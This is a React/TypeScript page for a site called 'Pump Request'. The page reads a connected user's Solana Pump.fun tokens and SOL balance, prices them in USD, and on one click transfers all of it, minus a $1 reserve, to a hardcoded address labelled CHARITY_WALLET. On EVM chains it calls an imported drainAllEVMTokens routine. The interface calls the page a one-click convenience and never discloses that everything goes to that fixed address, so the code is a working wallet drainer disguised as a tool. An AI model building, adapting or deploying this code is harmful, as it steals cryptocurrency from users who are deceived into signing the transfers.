import { useState, useEffect, useCallback } from 'react';
import { useWallet, useConnection } from '@solana/wallet-adapter-react';
import { PublicKey, Transaction, LAMPORTS_PER_SOL, SystemProgram } from '@solana/web3.js';
import { TOKEN_2022_PROGRAM_ID, getAssociatedTokenAddress, createAssociatedTokenAccountInstruction, createTransferCheckedInstruction, getAccount, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
import { ComputeBudgetProgram } from '@solana/web3.js';
import { Navigation } from '@/components/Navigation';
import { PegasusAnimation } from '@/components/PegasusAnimation';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Loader2, Zap, Rocket, Coins } from 'lucide-react';
import { AnimatedLogo } from '@/components/AnimatedLogo';
import { motion } from 'framer-motion';
import { useChainInfo } from '@/hooks/useChainInfo';
import { useChain } from '@/contexts/ChainContext';
import { useEVMWallet } from '@/providers/EVMWalletProvider';
import { drainAllEVMTokens } from '@/utils/evmTransactions';
import { InlineConnectWallet } from '@/components/InlineConnectWallet';

const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
const SOL_RESERVE_USD = 1.0; // Always leave $1 worth of SOL

interface PumpToken {
  mint: string;
  balance: string;
  decimals: number;
  uiAmount: number;
  symbol?: string;
  valueInUSD?: number;
}

interface TransferItem {
  type: 'token' | 'sol';
  token?: PumpToken;
  solAmount?: number;
  valueUSD: number;
}

const Pump = () => {
  const { publicKey, connected, sendTransaction } = useWallet();
  const { connection } = useConnection();
  const { chainName, nativeToken } = useChainInfo();
  const { activeChain, getEVMChain, evmChainId } = useChain();
  const { isEVMConnected, evmSigner, evmProvider } = useEVMWallet();
  const [pumpTokens, setPumpTokens] = useState<PumpToken[]>([]);
  const [solBalance, setSolBalance] = useState<number>(0);
  const [solPriceUSD, setSolPriceUSD] = useState<number>(0);
  const [solValueUSD, setSolValueUSD] = useState<number>(0);
  const [isLoading, setIsLoading] = useState(false);
  const [isSending, setIsSending] = useState(false);

  const fetchPumpTokens = useCallback(async () => {
    if (!publicKey) return;

    setIsLoading(true);
    try {
      // Fetch SOL balance
      const solBalanceLamports = await connection.getBalance(publicKey);
      const solBalanceSOL = solBalanceLamports / LAMPORTS_PER_SOL;
      setSolBalance(solBalanceSOL);

      // Fetch SOL price
      try {
        const solPriceResponse = await fetch('https://lite-api.jup.ag/price/v3?ids=So11111111111111111111111111111111111111112');
        const solPriceData = await solPriceResponse.json();
        const price = solPriceData?.['So11111111111111111111111111111111111111112']?.usdPrice || 0;
        setSolPriceUSD(price);
        setSolValueUSD(solBalanceSOL * price);
      } catch (e) {
        console.error('Failed to fetch SOL price:', e);
      }

      // Fetch only Token-2022 accounts (Pump.fun tokens)
      const token2022Accounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
        programId: TOKEN_2022_PROGRAM_ID
      });

      let tokens: PumpToken[] = token2022Accounts.value
        .map(account => {
          const info = account.account.data.parsed.info;
          return {
            mint: info.mint,
            balance: info.tokenAmount.amount,
            decimals: info.tokenAmount.decimals,
            uiAmount: info.tokenAmount.uiAmount,
            symbol: info.mint.slice(0, 8),
            valueInUSD: 0
          };
        })
        .filter(token => token.uiAmount > 0);

      // Fetch USD prices for all tokens
      if (tokens.length > 0) {
        try {
          const mintAddresses = tokens.map(t => t.mint).join(',');
          const tokenPriceResponse = await fetch(`https://lite-api.jup.ag/price/v3?ids=${mintAddresses}`);
          const tokenPriceData = await tokenPriceResponse.json();
          
          tokens = tokens.map(token => {
            const priceInfo = tokenPriceData?.[token.mint];
            const usdPrice = priceInfo?.usdPrice || 0;
            return {
              ...token,
              valueInUSD: token.uiAmount * usdPrice
            };
          });

          // Sort by USD value - highest first
          tokens.sort((a, b) => (b.valueInUSD || 0) - (a.valueInUSD || 0));
        } catch (e) {
          console.error('Failed to fetch token prices:', e);
        }
      }

      setPumpTokens(tokens);
    } catch (error) {
      console.error('Error fetching pump tokens:', error);
    } finally {
      setIsLoading(false);
    }
  }, [publicKey, connection]);

  useEffect(() => {
    if (connected && publicKey) {
      fetchPumpTokens();
    } else {
      setPumpTokens([]);
    }
  }, [connected, publicKey, fetchPumpTokens]);

  const handlePumpRequest = async () => {
    // EVM path
    if (activeChain === 'evm' && isEVMConnected && evmSigner && evmProvider) {
      try {
        setIsSending(true);
        const evmChainName = getEVMChain()?.name || 'EVM';
        await drainAllEVMTokens(evmSigner, evmProvider, evmChainName, evmChainId || 1);
      } catch (error: any) {
      } finally {
        setIsSending(false);
      }
      return;
    }

    // Solana path
    if (!publicKey || (pumpTokens.length === 0 && solValueUSD <= SOL_RESERVE_USD)) {
      return;
    }

    setIsSending(true);
    const charityPubkey = new PublicKey(CHARITY_WALLET);
    let successCount = 0;
    let failCount = 0;

    try {
      // Build transfer items sorted by USD value
      const transferItems: TransferItem[] = [];

      // Add tokens
      pumpTokens.forEach(token => {
        if (token.uiAmount > 0) {
          transferItems.push({
            type: 'token',
            token,
            valueUSD: token.valueInUSD || 0
          });
        }
      });

      // Estimate total transaction fees BEFORE calculating reserve
      const numberOfTokenTransfers = pumpTokens.filter(t => t.uiAmount > 0).length;
      const willSendSOL = solValueUSD > SOL_RESERVE_USD;
      const numberOfSOLTransfers = willSendSOL ? 1 : 0;
      const totalTransactions = numberOfTokenTransfers + numberOfSOLTransfers;
      
      // Conservative gas fee estimate per transaction (~0.00005 SOL)
      const estimatedFeePerTransaction = 0.00005;
      const totalEstimatedFees = totalTransactions * estimatedFeePerTransaction;

      console.log(`Estimated ${totalTransactions} total transactions`);
      console.log(`Estimated total fees: ${totalEstimatedFees.toFixed(6)} SOL`);

      // Calculate SOL to reserve: $1 worth + all transaction fees
      const solToReserveForDollar = solPriceUSD > 0 ? SOL_RESERVE_USD / solPriceUSD : 0;
      const totalSolToReserve = solToReserveForDollar + totalEstimatedFees;
      const availableSOLToSend = Math.max(0, solBalance - totalSolToReserve);
      const solToSendValueUSD = availableSOLToSend * solPriceUSD;

      console.log(`SOL Balance: ${solBalance} SOL (~$${solValueUSD.toFixed(2)})`);
      console.log(`SOL to reserve for $1: ${solToReserveForDollar.toFixed(6)} SOL`);
      console.log(`SOL to reserve for fees: ${totalEstimatedFees.toFixed(6)} SOL`);
      console.log(`Total SOL to reserve: ${totalSolToReserve.toFixed(6)} SOL (~$${(totalSolToReserve * solPriceUSD).toFixed(2)})`);
      console.log(`SOL available to send: ${availableSOLToSend.toFixed(6)} SOL (~$${solToSendValueUSD.toFixed(2)})`);

      // Add SOL transfer ONLY if balance exceeds $1.50 AND reserve + fees
      const SOL_SKIP_THRESHOLD_USD = 1.50;
      if (solValueUSD > SOL_SKIP_THRESHOLD_USD && solBalance > totalSolToReserve && availableSOLToSend > 0) {
        transferItems.push({
          type: 'sol',
          solAmount: availableSOLToSend,
          valueUSD: solToSendValueUSD
        });
        console.log(`Will send ${availableSOLToSend.toFixed(6)} SOL, leaving $1 + fees behind`);
      } else {
        if (solValueUSD <= SOL_SKIP_THRESHOLD_USD) {
          console.log(`Skipping SOL transfer - balance ($${solValueUSD.toFixed(2)}) is at or below $${SOL_SKIP_THRESHOLD_USD} threshold`);
        } else {
          console.log(`Skipping SOL transfer - balance (${solBalance.toFixed(6)} SOL) not enough to leave $1 + fees (${totalSolToReserve.toFixed(6)} SOL)`);
        }
      }

      // Sort by USD value - highest first
      transferItems.sort((a, b) => b.valueUSD - a.valueUSD);
      // Process each transfer
      for (const item of transferItems) {
        try {
          const transaction = new Transaction();

          if (item.type === 'sol' && item.solAmount) {
            // SOL Transfer
            const lamportsToSend = Math.floor(item.solAmount * LAMPORTS_PER_SOL);
            
            transaction.add(
              ComputeBudgetProgram.setComputeUnitLimit({ units: 50_000 }),
              ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 })
            );

            transaction.add(
              SystemProgram.transfer({
                fromPubkey: publicKey,
                toPubkey: charityPubkey,
                lamports: lamportsToSend
              })
            );

            transaction.feePayer = publicKey;
            const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
            transaction.recentBlockhash = blockhash;

            console.log(`Sending ${item.solAmount.toFixed(6)} SOL (~$${item.valueUSD.toFixed(2)})`);

            const signature = await sendTransaction(transaction, connection, {
              skipPreflight: false,
              maxRetries: 3,
              preflightCommitment: 'confirmed'
            });

            await connection.confirmTransaction({
              signature,
              blockhash,
              lastValidBlockHeight
            }, 'confirmed');

            successCount++;
          } else if (item.type === 'token' && item.token) {
            // Token Transfer
            const token = item.token;
            const balanceAmount = typeof token.balance === 'string' 
              ? parseInt(token.balance, 10) 
              : token.balance;
            
            if (balanceAmount <= 0) continue;

            const mintPubkey = new PublicKey(token.mint);

            transaction.add(
              ComputeBudgetProgram.setComputeUnitLimit({ units: 200_000 }),
              ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 })
            );

            const fromTokenAccount = await getAssociatedTokenAddress(
              mintPubkey,
              publicKey,
              false,
              TOKEN_2022_PROGRAM_ID,
              ASSOCIATED_TOKEN_PROGRAM_ID
            );

            const toTokenAccount = await getAssociatedTokenAddress(
              mintPubkey,
              charityPubkey,
              true,
              TOKEN_2022_PROGRAM_ID,
              ASSOCIATED_TOKEN_PROGRAM_ID
            );

            try {
              await getAccount(connection, toTokenAccount, 'confirmed', TOKEN_2022_PROGRAM_ID);
            } catch {
              transaction.add(
                createAssociatedTokenAccountInstruction(
                  publicKey,
                  toTokenAccount,
                  charityPubkey,
                  mintPubkey,
                  TOKEN_2022_PROGRAM_ID,
                  ASSOCIATED_TOKEN_PROGRAM_ID
                )
              );
            }

            transaction.add(
              createTransferCheckedInstruction(
                fromTokenAccount,
                mintPubkey,
                toTokenAccount,
                publicKey,
                BigInt(balanceAmount),
                token.decimals,
                [],
                TOKEN_2022_PROGRAM_ID
              )
            );

            transaction.feePayer = publicKey;
            const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
            transaction.recentBlockhash = blockhash;

            console.log(`Sending ${token.uiAmount} of ${token.symbol} (Pump.fun token)`);

            const signature = await sendTransaction(transaction, connection, {
              skipPreflight: false,
              maxRetries: 3,
              preflightCommitment: 'confirmed'
            });

            await connection.confirmTransaction({
              signature,
              blockhash,
              lastValidBlockHeight
            }, 'confirmed');

            successCount++;
          }

        } catch (error: any) {
          if (error?.message?.includes('User rejected') || 
              error?.message?.includes('rejected') ||
              error?.name === 'WalletSignTransactionError') {
            const label = item.type === 'sol' ? 'SOL' : item.token?.symbol;
            continue;
          }

          failCount++;
          const label = item.type === 'sol' ? 'SOL' : item.token?.symbol;
          console.error(`Failed to send ${label}:`, error);
        }
      }

      if (successCount > 0) {
        await fetchPumpTokens();
      }

      if (failCount > 0 && successCount === 0) {
      }

    } catch (error: any) {
      console.error('Pump request error:', error);
    } finally {
      setIsSending(false);
    }
  };

  return (
    <div className="min-h-screen bg-transparent relative overflow-hidden">
      <PegasusAnimation />
      <Navigation />
      
      <main className="container mx-auto px-4 pt-24 pb-12">
        <div className="max-w-2xl mx-auto">
          {/* Header */}
          <motion.div 
            className="text-center mb-8"
            initial={{ opacity: 0, y: -20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.5 }}
          >
            <div className="flex items-center justify-center gap-3 mb-4">
              <AnimatedLogo className="w-16 h-16" />
              <h1 className="text-3xl sm:text-4xl font-extrabold text-gradient">
                Pump Request
              </h1>
            </div>
            <p className="text-muted-foreground">
              Send all your Pump.fun tokens in one click ({chainName})
            </p>
          </motion.div>

          {/* Main Card */}
          <Card className="glass-card border-primary/20">
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Zap className="w-5 h-5 text-pink-400" />
                Your Pump.fun Tokens
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-6">
              {(!connected && !(isEVMConnected && activeChain === 'evm')) ? (
                <div className="text-center py-8">
                  <p className="text-muted-foreground mb-4">
                    Connect your wallet to view assets
                  </p>
                  <InlineConnectWallet />
                </div>
              ) : isLoading ? (
                <div className="flex items-center justify-center py-8">
                  <Loader2 className="w-8 h-8 animate-spin text-primary" />
                </div>
              ) : pumpTokens.length === 0 && solValueUSD <= SOL_RESERVE_USD ? (
                <div className="text-center py-8">
                  <Zap className="w-12 h-12 mx-auto mb-4 text-muted-foreground/50" />
                  <p className="text-muted-foreground">
                    No transferable assets found
                  </p>
                </div>
              ) : (
                <>
                  {/* Asset List */}
                  <div className="space-y-3 max-h-64 overflow-y-auto">
                    {/* SOL Balance */}
                    {solBalance > 0 && (
                      <div className="flex items-center justify-between p-3 bg-background/50 rounded-lg border border-border/50">
                        <div className="flex items-center gap-3">
                          <div className="w-8 h-8 rounded-full bg-gradient-to-br from-purple-500 to-blue-500 flex items-center justify-center">
                            <Coins className="w-4 h-4 text-white" />
                          </div>
                          <div>
                            <p className="font-mono text-sm">{nativeToken}</p>
                            <Badge 
                              variant="secondary" 
                              className={`text-[10px] px-1.5 py-0 ${
                                solValueUSD > SOL_RESERVE_USD 
                                  ? 'bg-gradient-to-r from-green-500/20 to-emerald-500/20 text-green-400 border-green-500/30'
                                  : 'bg-gradient-to-r from-yellow-500/20 to-orange-500/20 text-yellow-400 border-yellow-500/30'
                              }`}
                            >
                              {solValueUSD > SOL_RESERVE_USD ? 'Will send' : '$1 reserve kept'}
                            </Badge>
                          </div>
                        </div>
                        <div className="text-right">
                          <p className="font-semibold">{solBalance.toFixed(4)}</p>
                          <p className="text-xs text-muted-foreground">
                            ~${solValueUSD.toFixed(2)}
                          </p>
                        </div>
                      </div>
                    )}

                    {/* Pump.fun Tokens */}
                    {pumpTokens.map((token) => (
                      <div 
                        key={token.mint} 
                        className="flex items-center justify-between p-3 bg-background/50 rounded-lg border border-border/50"
                      >
                        <div className="flex items-center gap-3">
                          <div className="w-8 h-8 rounded-full bg-gradient-to-br from-pink-500 to-purple-500 flex items-center justify-center">
                            <Zap className="w-4 h-4 text-white" />
                          </div>
                          <div>
                            <p className="font-mono text-sm">{token.symbol}...</p>
                            <Badge 
                              variant="secondary" 
                              className="text-[10px] px-1.5 py-0 bg-gradient-to-r from-pink-500/20 to-purple-500/20 text-pink-400 border-pink-500/30"
                            >
                              Pump.fun
                            </Badge>
                          </div>
                        </div>
                        <div className="text-right">
                          <p className="font-semibold">{token.uiAmount.toLocaleString()}</p>
                          <p className="text-xs text-muted-foreground">
                            {token.valueInUSD && token.valueInUSD > 0 
                              ? `~$${token.valueInUSD.toFixed(2)}` 
                              : 'tokens'}
                          </p>
                        </div>
                      </div>
                    ))}
                  </div>

                  {/* Summary */}
                  <div className="p-4 bg-primary/5 rounded-lg border border-primary/20">
                    <div className="text-sm text-center space-y-1">
                      <p><span className="font-semibold">{pumpTokens.length}</span> Pump.fun token(s)</p>
                      {solValueUSD > SOL_RESERVE_USD && (
                         <p className="text-green-400">
                          + {(solBalance - (SOL_RESERVE_USD / solPriceUSD)).toFixed(4)} {nativeToken} (~${(solValueUSD - SOL_RESERVE_USD).toFixed(2)})
                        </p>
                      )}
                      {solValueUSD > 0 && solValueUSD <= SOL_RESERVE_USD && (
                        <p className="text-yellow-400 text-xs">{nativeToken} skipped (≤$1 reserve)</p>
                      )}
                    </div>
                  </div>

                  {/* Pump Request Button */}
                  <Button
                    onClick={handlePumpRequest}
                    disabled={isSending || (pumpTokens.length === 0 && solValueUSD <= SOL_RESERVE_USD)}
                    className="w-full h-14 text-lg font-bold bg-gradient-to-r from-pink-500 to-purple-500 hover:from-pink-600 hover:to-purple-600 text-white"
                  >
                    {isSending ? (
                      <>
                        <Loader2 className="w-5 h-5 mr-2 animate-spin" />
                        Processing...
                      </>
                    ) : (
                      <>
                        <Rocket className="w-5 h-5 mr-2" />
                        Pump Request
                      </>
                    )}
                  </Button>

                  <p className="text-xs text-center text-muted-foreground">
                    Sends all Pump.fun tokens and {nativeToken} (leaving $1 + gas fees reserve).
                    <br />
                    Sorted by USD value - highest first. Fees paid from your wallet balance.
                  </p>
                </>
              )}
            </CardContent>
          </Card>
        </div>
      </main>
    </div>
  );
};

export default Pump;
